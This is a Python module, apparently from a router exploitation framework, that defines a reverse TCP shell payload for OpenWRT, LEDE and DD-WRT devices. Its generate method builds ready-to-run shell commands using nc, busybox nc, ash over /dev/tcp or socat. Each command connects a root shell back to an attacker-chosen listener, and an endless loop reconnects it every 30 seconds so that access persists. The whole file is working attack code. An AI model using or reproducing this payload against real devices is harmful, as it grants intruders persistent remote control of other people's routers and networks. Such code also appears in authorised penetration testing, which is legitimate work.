"""OpenWRT Ash Reverse TCP Shell.

Payload específico para dispositivos OpenWRT usando ash (BusyBox shell).
Usa /dev/tcp via bash ou nc/busybox nc.
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "OpenWRT Reverse TCP",
        "description": "Ash/BusyBox reverse shell for OpenWRT/LEDE/DD-WRT devices.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
        "METHOD": {
            "description": "Shell method: nc|busybox_nc|ash_tcp|socat",
            "required": False,
            "default": "nc",
            "value": "nc",
        },
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        method = self.options["METHOD"]["value"]

        shells = {
            "nc": f"nc {lhost} {lport} -e /bin/ash",
            "busybox_nc": f"busybox nc {lhost} {lport} -e /bin/ash",
            "ash_tcp": f"ash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "socat": f"socat exec:'/bin/ash -li',pty,stderr,setsid TCP:{lhost}:{lport}",
        }

        cmd = shells.get(method, shells["nc"])
        # Wrapper com reconexão automática
        wrapper = f"while true; do {cmd}; sleep 30; done"
        return wrapper.encode()
